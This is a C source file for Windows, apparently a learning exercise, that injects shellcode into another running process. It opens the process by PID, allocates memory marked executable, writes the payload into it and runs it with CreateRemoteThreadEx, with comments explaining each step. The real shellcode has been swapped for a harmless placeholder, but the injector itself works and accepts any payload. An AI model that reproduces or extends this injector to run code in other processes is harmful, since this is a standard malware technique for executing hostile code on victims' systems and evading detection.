#include<stdio.h>
#include<windows.h>
const char* k = "[+]";
const char* i = "[+]";
const char* e = "[+]";

DWORD PID = NULL, TID = NULL;
PVOID rBuffer = NULL;
HANDLE hProcess = NULL, hThread = NULL;
unsigned char shellcode[] ={
    // FOR SAFETY THE ORGINAL SHELLCODE HAS BEEN REMOVED 
    0x90, 0x90, 0x90, 0xCC  // DEMO CODE FOR COMPILATION :P
};


size_t shellcode_size = sizeof(shellcode);
int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("%s usage: program.exe <PID>", e);
		return EXIT_FAILURE;
	}
	PID = atoi(argv[1]);
	printf("%s is trying to open the handel to process %ld\n", i, PID);
	//given  the handel to open the process  
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL) {
		printf("%s failed to get handel to %ld, error code: %ld\n", e, PID, GetLastError());
		return EXIT_FAILURE;
	}
	else {
		printf("%s got the handel to process \n%ld\n", k, PID);
	}
	//via the lines above we have got the handel of the process we wanted to inject 
	//now we will be allocating memory in the target process 
	rBuffer = VirtualAllocEx(hProcess, NULL, shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu bytes of memory to the process %ld \n", k, sizeof(shellcode), PID);
	//Now we will actually write that allocated memory to the process memory 
	WriteProcessMemory(hProcess, rBuffer, shellcode,shellcode_size, NULL);
	printf("%s we have succsfully wrote in the process %ld\n", k, PID);
	//Now we will create a thread in the target process to execute the shellcode
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
	if (hThread == NULL) {
		printf("%s failed to create a thread in the process %ld, error code: %ld\n", e, PID, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	else {
		printf("%s created a thread in the process %ld with TID: %ld\n", k, PID, TID);
	}


	printf("Cleaning up ");
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("See you next time");
	return EXIT_SUCCESS;
}
